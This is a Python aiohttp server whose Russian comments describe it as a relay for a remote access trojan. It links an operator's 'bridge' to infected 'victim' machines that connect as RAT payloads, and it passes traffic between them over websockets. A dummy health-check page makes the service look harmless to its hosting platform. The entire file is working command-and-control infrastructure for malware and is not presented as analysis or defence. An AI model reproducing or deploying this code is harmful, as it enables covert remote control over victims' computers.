import os
from aiohttp import web

# Хранилище соединений
village_ws = None
remote_clients = {}

async def handle_control(request):
    """Канал для твоего домашнего моста (bridge.py)"""
    global village_ws
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    village_ws = ws
    print("[+] Мост из деревни подключен")
    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.BINARY:
                # Пересылаем данные от тебя к жертве
                data = msg.data
                if data.startswith(b"DATA:"):
                    _, conn_id, payload = data.split(b":", 2)
                    cid = conn_id.decode()
                    if cid in remote_clients:
                        await remote_clients[cid].send_bytes(payload)
    finally:
        village_ws = None
        print("[-] Мост отключен")
    return ws

async def handle_traffic(request):
    """Канал для входящих подключений (RAT payload)"""
    if village_ws is None:
        return web.Response(status=503, text="Tunnel Offline")
    
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    
    import uuid
    conn_id = str(uuid.uuid4())[:8]
    remote_clients[conn_id] = ws
    print(f"[*] Новая цель подключена: {conn_id}")
    
    await village_ws.send_str(f"OPEN:{conn_id}")
    
    try:
        async for msg in ws:
            payload = msg.data if msg.type == web.WSMsgType.BINARY else msg.data.encode()
            header = f"DATA:{conn_id}:".encode()
            await village_ws.send_bytes(header + payload)
    finally:
        if village_ws:
            await village_ws.send_str(f"CLOSE:{conn_id}")
        remote_clients.pop(conn_id, None)
    return ws

async def health_check(request):
    """Заглушка для Render, чтобы он не ругался"""
    return web.Response(text="Nexus Server is Running")

app = web.Application()
app.router.add_get('/control', handle_control)
app.router.add_get('/', health_check)
app.router.add_get('/{tail:.*}', handle_traffic)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    web.run_app(app, port=port)
